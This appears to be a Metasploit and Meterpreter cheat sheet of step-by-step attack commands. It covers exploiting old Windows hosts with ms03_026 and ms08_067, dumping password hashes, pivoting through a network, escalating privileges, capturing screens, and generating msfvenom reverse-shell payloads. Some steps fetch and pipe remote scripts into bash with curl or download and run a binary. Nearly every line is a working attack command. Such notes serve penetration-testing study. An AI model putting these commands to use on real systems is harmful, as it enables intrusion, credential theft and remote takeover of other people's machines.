
**Set payload:**<br/>
```sh
set payload exploit/multi/handler
```

# Quick Commands
**Background a Session With:** `ctrl + z`<br/>
**See Background Sessions:** `sessions -l`<br/>
**Go back into backgrounded sessions:** `sessions -i <session num>`<br/>
**Show Parameters:** `options`<br/>
**Dump Hashes:** `hashdump`<br/>
**Windows Hashdump alt:**`post/windows/gather/hashdump`<br/>
**Grab Interface Info:** `ipconfig`<br/>
**Network Pivot:** `run autoroute -s <interfaceIP>/<Cidr Mask>`<br/>
	
# Easy winxp pwn
**IN the metasploit console:**<br/>
```sh
use exploit/windows/dcerpc/ms03_026_dcom
set payload windows/meterpreter/bind_tcp
set RHOST <xp machine IP>
exploit
```

# Easy Win2000 pwn
**IN the metasploit console:**<br/>
```sh
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set rhost <Target IP>
set lhost <attacker IP>
set lport <attacker port>
exploit
```

# Auxiliary port scan
```sh
# In the meterpreter shell of the infected machine
run autoroute -s <interfaceIP>/<Cidr Mask>
# Ctrl+Z to background she shell
auxiliary/scanner/portscan/tcp
set RHOSTS <pivot IP>/<Cidr Mask>
set ports <port 1>,<port 2>,<port n>
set threads 50
run
```

# Privilege Escalation 
**To elevate your privilege you can use the commands:**<br/>
```sh
use priv
getsystem

# OR
use exploit/windows/local/<technique>
# SET YOUR OPTIONS
exploit
```

# Screen capture:
```sh
# Elevate privlages
getsystem
# Load Library 
use espia
# Migrate to Explorer.exe
ps
migrate <pid of explorer.exe>
# Grabb Screenshot
screengrab
```

# Linux Elevate your shell:
**Generate your payloads:**<br/>
```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=1234 -f raw > shell.sh

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.bin
```

**Start Listener and Server:**<br/>
```sh
python3 -m http.server
nc -nlvp 1234
```

**Use your unstable shell to download the stable shell bin:**<br/>
```sh
curl <ip>:8000/shell.sh | bash
```

**Start your meterpreter listener:**<br/>
```sh
set payload linux/x86/meterpreter/reverse_tcp
use exploit/multi/handler
exploit
```

**Download your meterpreter payload and run it:**<br/>
```sh
curl -o /tmp/shell.bin <ip>:8000/shell.bin
chmod +x /tmp/shell.bin
cd /tmp
./shell.bin
```

**Elevate the shell's permissions:**<br/>
```sh
^Z
use post/multi/recon/local_exploit_suggester
exploit
```